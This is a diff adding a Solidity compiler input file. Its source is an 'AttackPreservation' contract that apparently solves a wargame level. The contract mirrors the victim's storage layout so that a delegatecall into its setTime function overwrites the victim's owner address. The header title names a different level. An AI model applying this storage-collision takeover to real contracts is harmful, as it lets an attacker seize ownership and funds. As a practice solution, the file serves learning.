@@ -1,0 +1,35 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/Preservation/AttackPreservation.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/// @title AttackGateKeeperOne\n/// @author IbCaOs\ncontract AttackPreservation {\n\n    address constant target = 0xA5DB1DfEC68DF8d5fBDd46f02755108ecb7249d6;\n    // Same variables than Preservation contract. We need to maintain same context with storage variable\n    address public timeZone1Library;\n    address public timeZone2Library;\n    address public owner; \n    uint storedTime;\n\n    function setTime(uint _time) public {\n        owner = address(uint160(_time));\n    }\n}\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
